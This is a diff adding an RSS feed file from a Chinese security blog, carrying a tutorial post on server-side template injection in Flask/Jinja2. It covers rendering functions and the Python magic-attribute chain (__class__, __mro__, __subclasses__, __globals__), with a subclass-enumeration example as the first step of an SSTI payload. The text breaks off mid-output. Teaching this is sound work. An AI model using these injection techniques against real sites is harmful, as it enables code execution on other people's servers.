@@ -1,0 +1,568 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WEB on BU44ER's BLOG</title><link>https://bu44er.ink/tags/web/</link><description>Recent content in WEB on BU44ER's BLOG</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 21 Sep 2024 19:17:14 +0800</lastBuildDate><atom:link href="https://bu44er.ink/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>SSTI 漏洞</title><link>https://bu44er.ink/p/6b9l0s6c/</link><pubDate>Sat, 21 Sep 2024 19:17:14 +0800</pubDate><guid>https://bu44er.ink/p/6b9l0s6c/</guid><description>&lt;p>SSTI （Server-Side Template Injection）服务器端模板注入&lt;/p>
+&lt;p>特征：&lt;/p>
+&lt;ul>
+&lt;li>网站能够返回用户的自定义内容，并以一种“模板”的形式&lt;/li>
+&lt;li>&lt;code>{}&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="背景">背景
+&lt;/h2>&lt;p>模板的诞生是为了将显示与数据分离，模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。&lt;/p>
+&lt;ul>
+&lt;li>通俗理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。&lt;/li>
+&lt;/ul>
+&lt;p>常见模板有：&lt;/p>
+&lt;ul>
+&lt;li>python框架 jinja2 mako tornado django&lt;/li>
+&lt;li>PHP框架 smarty twig&lt;/li>
+&lt;li>java框架 jade velocity&lt;/li>
+&lt;/ul>
+&lt;p>这些框架使用渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞。&lt;/p>
+&lt;hr>
+&lt;h2 id="flask-基础">flask 基础
+&lt;/h2>&lt;ul>
+&lt;li>常见的基于Python的模板&lt;/li>
+&lt;/ul>
+&lt;h3 id="实例最小的-flask">实例：最小的 flask
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 导入Flask类.用于后面实例化出一个WSGI应用程序.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 创建Flask实例,传入的第一个参数为模块或包名.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># route 装饰器的作用是将函数与url绑定起来，即把 helloworld 这个函数与根目录绑定&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 使用 route() 装饰器告诉 Flask 什么样的 URL 能触发我们的函数&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">hello_world&lt;/span>&lt;span class="p">():&lt;/span> &lt;span class="c1"># put application&amp;#39;s code here&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;Hello World!&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># app.run()函数让应用在本地启动&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>route 装饰器的作用是将函数与url绑定起来&lt;/li>
+&lt;/ul>
+&lt;p>python3执行：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 hello.py
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Serving Flask app &lt;span class="s1">&amp;#39;hello&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Debug mode: off
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Running on http://127.0.0.1:5000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press CTRL+C to quit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="渲染方法">渲染方法
+&lt;/h3>&lt;p>flask的渲染方法有 &lt;code>render_template&lt;/code> 和 &lt;code>render_template_string&lt;/code> 两种。&lt;/p>
+&lt;p>&lt;code>render_template()&lt;/code> 是用来渲染一个指定的文件的：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>render_template_string&lt;/code> 则是用来渲染一个字符串的，SSTI与这个方法密不可分。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">html&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;h1&amp;gt;This is index page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="route-装饰器路由">route 装饰器路由
+&lt;/h3>&lt;p>使用route()装饰器告诉Flask什么样的URL能触发我们的函数。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>.route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">123&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>此外还可以设置动态网址&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/hello/&amp;lt;username&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">hello_user&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;user:&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">username&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>![[../../../../img/Pasted image 20240716152629.png|300]]&lt;/p>
+&lt;h3 id="重点模板渲染">重点：模板渲染
+&lt;/h3>&lt;p>Flask的模板引擎是&lt;code>jinja2&lt;/code>，文档可以参考这个&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://svn.python.org/projects/external/Jinja-2.1.1/docs/_build/html/api.html#basics" target="_blank" rel="noopener"
+>https://svn.python.org/projects/external/Jinja-2.1.1&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>在网站的根目录下新建&lt;code>templates&lt;/code>文件夹，用来存放模板文件。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>SSTI&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h3&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Hello, {{name}}&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h3&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>模板文件使用 HTML 的语法，但并不是单纯的 HTML 代码，代码中==夹杂着模板的语法==&lt;/li>
+&lt;li>&lt;code>{{}}&lt;/code> 就是模板的语法，表示其中是需要渲染的内容&lt;/li>
+&lt;li>在Jinja2 ，用&lt;code>{{}}&lt;/code> 作为变量包裹标识符，用&lt;code>{% ... %}&lt;/code>表示指令&lt;/li>
+&lt;li>Jinja2 主要是 ==Python2== 的环境&lt;/li>
+&lt;/ul>
+&lt;p>此时我们写我们的模板渲染代码(app.py)，内容如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">render_template&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">hello_world&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># GET取参数name的值&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;test.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 将name的值传入模板,进行渲染&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">30000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>文件结构：
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240921192250.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>测试结果：
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240921192254.png"
+loading="lazy"
+>&lt;/p>
+&lt;hr>
+&lt;h2 id="python-魔术方法">python 魔术方法
+&lt;/h2>&lt;p>在Python的SSTI中，大部分是依靠 ==基类-&amp;gt;子类-&amp;gt;危险函数== 的方式来利用SSTI&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">__class__&lt;/span> &lt;span class="err">万物皆对象，&lt;/span>&lt;span class="n">class用于返回该对象所属的类&lt;/span>&lt;span class="err">，比如某个字符串，他的对象为字符串对象，而其所属的类为&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">class&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__mro__&lt;/span> &lt;span class="err">返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__base__&lt;/span> &lt;span class="err">以字符串返回一个类所直接继承的类。&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__bases__&lt;/span> &lt;span class="err">以元组的形式返回一个类所直接继承的类。&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// __base__和__mro__都是用来寻找基类的
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__subclasses__&lt;/span> &lt;span class="err">每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表，获取类的所有子类。&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__init__&lt;/span> &lt;span class="err">类的初始化方法，所有自带带类都包含&lt;/span>&lt;span class="n">init方法&lt;/span>&lt;span class="err">，便于利用他当跳板来调用&lt;/span>&lt;span class="n">globals&lt;/span>&lt;span class="err">。&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__globals__&lt;/span> &lt;span class="err">函数会以字典类型返回当前位置的全部全局变量&lt;/span> &lt;span class="err">与&lt;/span> &lt;span class="n">func_globals&lt;/span> &lt;span class="err">等价&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="实例">实例
+&lt;/h4>&lt;p>&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240924101851.png"
+loading="lazy"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 寻找可用引用（子类）&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;weakref&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;weakcallableproxy&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;weakproxy&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;int&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;basestring&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;bytearray&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;list&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;NoneType&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;NotImplementedType&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;traceback&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;super&amp;#39;&lt;/span>&lt;span 